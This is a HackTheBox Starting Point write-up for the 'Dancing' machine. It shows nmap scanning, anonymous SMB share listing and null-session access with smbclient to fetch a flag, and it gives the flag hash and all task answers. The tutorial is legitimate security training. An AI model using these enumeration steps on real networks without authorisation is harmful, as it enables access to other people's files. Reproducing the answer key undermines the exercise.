# HackTheBox — Dancing Writeup

**Difficulty:** Very Easy  
**Tier:** 0 (Starting Point)  
**Protocol Focus:** SMB (Server Message Block)  
**OS:** Windows

---

## Overview

Dancing is a Tier 0 Starting Point machine on HackTheBox designed to introduce beginners to SMB enumeration. The goal is to enumerate SMB shares, access one without credentials, and retrieve the flag.

---

## Setup

Connect to the HTB network using one of two methods:

- **Pwnbox** — in-browser option, no VPN needed
- **OpenVPN** — download the `.ovpn` config from HackTheBox and connect:

```bash
sudo openvpn your_vpn_file.ovpn
```

Spawn the target machine from the Starting Point lab page and note the IP address.

Verify connectivity:

```bash
ping <target_ip>
```

---

## Enumeration

### Nmap Scan

Run a service version scan to identify open ports:

```bash
sudo nmap -sV <target_ip>
```

**Expected output (relevant ports):**

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server (SMB)
```

> **Task answers:**
> - *What does the 3-letter acronym SMB stand for?* → `Server Message Block`
> - *What port does SMB use?* → `445`
> - *What is the service name for port 445?* → `microsoft-ds`

---

## SMB Enumeration

### List Available Shares

Use `smbclient` with the `-L` flag to list shares. When prompted for a password, press **Enter** (blank password):

```bash
smbclient -L <target_ip>
```

**Expected output:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

> **Task answers:**
> - *What flag lists available shares?* → `-L`
> - *How many shares are there?* → `4`
> - *Which share can we access with a blank password?* → `WorkShares`

---

## Accessing the Share

Connect to the `WorkShares` share (press **Enter** when prompted for a password):

```bash
smbclient \\\\<target_ip>\\WorkShares
```

You will drop into an SMB shell. Navigate the directory structure:

```
smb: \> ls
  .                                   D        0  Mon Mar 29 08:22:01 2021
  ..                                  D        0  Mon Mar 29 08:22:01 2021
  Amy.J                               D        0  Mon Mar 29 09:08:24 2021
  James.P                             D        0  Thu Jun  3 08:38:03 2021

smb: \> cd James.P
smb: \James.P\> ls
  flag.txt                            A       32  Mon Mar 29 09:26:57 2021
```

### Download the Flag

```bash
smb: \James.P\> get flag.txt
```

Exit the shell and read the flag:

```bash
exit
cat flag.txt
```

> **Root flag:** `5f61c10dffbc77a704d76016a22f1664`

---

## Task Answer Summary

| Task | Answer |
|------|--------|
| What does SMB stand for? | Server Message Block |
| What port does SMB use? | 445 |
| Service name for port 445? | microsoft-ds |
| Flag to list shares with smbclient? | `-L` |
| How many shares on Dancing? | 4 |
| Share accessible with blank password? | WorkShares |
| SMB shell command to download files? | `get` |

---

## Key Takeaways

- **SMB** (port 445) is a Windows file-sharing protocol commonly found in internal networks.
- Misconfigured shares can allow unauthenticated (null session) access.
- `smbclient` is a standard Linux tool for interacting with SMB shares.
- Always enumerate share names before attempting to connect — some may be restricted.

---

*HTB Starting Point — Tier 0 | Dancing*